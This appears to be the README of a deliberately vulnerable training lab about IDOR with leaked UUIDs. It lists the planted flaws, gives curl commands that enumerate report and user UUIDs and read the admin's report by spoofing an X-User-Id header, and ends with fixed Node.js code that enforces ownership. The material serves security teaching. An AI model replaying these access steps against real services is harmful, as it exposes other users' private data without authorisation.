# Lab 13 — IDOR UUID Bypass 🔴

**Port:** `8013` | **Stack:** Node.js + PostgreSQL | **Swagger:** `http://localhost:8013/api-docs`  
**Difficulty:** Intermediate

---

## 🕳️ Security Loopholes

1. **UUID ≠ Security** — UUIDs prevent *guessing* but not IDOR if they're leaked
2. **`GET /reports` Leaks All UUIDs** — List endpoint exposes all resource IDs to any authenticated user
3. **`/debug/users` Leaks All User UUIDs** — Debug endpoint left in production
4. **No Ownership Check** — `GET /reports/:id` returns any report to any user once ID is known

---

## 🎯 Attack Scenarios

### Scenario A — Enumerate UUIDs then Exploit IDOR
```bash
docker compose up -d

# Step 1: Get all report UUIDs from the list endpoint
curl http://localhost:8013/reports -H "X-User-Id: 22222222-2222-2222-2222-222222222222"

# Step 2: Grab the admin's confidential report UUID from the list
# aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

# Step 3: Access admin's report as Alice (IDOR!)
curl http://localhost:8013/reports/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa \
  -H "X-User-Id: 22222222-2222-2222-2222-222222222222"
```

### Scenario B — Debug Endpoint Gives All User IDs
```bash
# No auth needed — leaks all user UUIDs
curl http://localhost:8013/debug/users

# Now impersonate admin using their UUID
curl http://localhost:8013/users/11111111-1111-1111-1111-111111111111/reports \
  -H "X-User-Id: 22222222-2222-2222-2222-222222222222"
```

### Scenario C — UUID Leak via Other Channels (Real World)
```bash
# In real apps, UUIDs leak via:
# - HTTP Referrer headers in emails/links
# - JavaScript source files
# - API responses with nested objects
# - Error messages
# - Browser history / bookmarks
# - Log files accessible via path traversal

# Once known, exploit is identical to integer IDOR
curl http://localhost:8013/reports/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa \
  -H "X-User-Id: 33333333-3333-3333-3333-333333333333"
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `curl` | Manual UUID enumeration |
| Burp Suite | Extract UUIDs from all responses, replay on IDOR targets |
| `trufflehog` | Find leaked UUIDs in git history |
| `gf` | Extract UUIDs from JS files: `gf uuid` |

---

## 🔐 How to Fix

```javascript
// 1. Always enforce ownership — UUID alone is not enough
app.get('/reports/:id', auth, async (req, res) => {
  const result = await pool.query(
    'SELECT * FROM reports WHERE id = $1 AND owner_id = $2',
    [req.params.id, req.userId]
  );
  if (!result.rows.length) return res.status(403).json({ error: 'Forbidden' });
  res.json(result.rows[0]);
});

// 2. Remove /debug endpoints before production deployment
// 3. List endpoints should only return items the user owns
app.get('/reports', auth, async (req, res) => {
  const result = await pool.query(
    'SELECT id, title FROM reports WHERE owner_id = $1', [req.userId]
  );
  res.json(result.rows);
});

// 4. Use random UUIDs (v4), never sequential or patterned
```
